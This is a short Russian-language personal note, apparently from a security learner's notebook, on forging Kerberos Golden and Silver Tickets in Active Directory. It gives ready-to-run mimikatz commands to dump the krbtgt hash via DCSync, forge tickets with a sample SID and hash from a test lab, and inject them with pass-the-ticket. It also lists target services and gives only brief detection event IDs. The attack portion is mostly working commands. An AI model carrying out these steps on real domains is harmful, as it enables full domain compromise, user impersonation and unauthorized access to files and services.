#windows #AD #kerberos #attacks 

> Необходим для получении сессии любого пользователя

Если у пользователя есть хэш специальной учетки krbtgt, то его хэшем подписываютсяабсолютно все TGT

- TGT зашифрован секретом krbtgt
- TGS зашифрован секретом учетной записи из-под которой работает аккаунт

![[Golden Ticket.png]]
## Для атаки необходимо:

1)  _FQDN_ домена.
2)  _SID_ домена.
3)  Имя пользователя для имперсонификации.
4)  *Хеш пароля krbtgt

Самый сложный 4 пункт, однако его можно получить, напрмер, через атаку DCSync

## Атака

0.0) Проведение DCSync

Через нее получаем все необходимые данные 
```mimikatz
lsadump::dcsync /user:<blabla>\krbtgt
```

1.1) Выпуск Golden Ticket
```mimikatz
kerberos::golden /user:idyachkov /domain:testlab.esc /sid:S-1-5-21-1129291328-2819992169-918366777  /krbtgt:d55b37f6d892bb4ad68655b217e0af80 /id:1110 /groups:513 /ticket:idyachkov.testlab.esc
```

1.2) Выпуск Silver Ticket
```mimikatz
kerberos::golden /user:idyachkov /domain:testlab.esc /sid:S-1-5-21-1129291328-2819992169-918366777 /target:DC01.testlab.esc /service:CIFS /rc4:d55b37f6d892bb4ad68655b217e0af80 /id:1110 /groups:513 /ticket:idyachkov_silver.kirbi
```

 Популярные службы для Silver Tickets

- **CIFS** - доступ к файловым ресурсам (`\\server\C$`)
- **HOST** - управление службами + WMI + PowerShell
- **HTTP** - веб-приложения, SharePoint
- **LDAP** - запросы к Active Directory
- **MSSQL** - доступ к базам данных
- **RPCSS** - удаленные вызовы процедур
- **WSMAN** - PowerShell Remoting

 
2.0) Получение сессии
```mimikatz
kerberos::ptt <ticket>
```

## Detect attack

Event ID
1) 4768 TGT was granted
2) 4769 TGS was granted

При атаке Golden Ticket мы не запрашиваем TGT у DC, а генерируем его самостоятельно



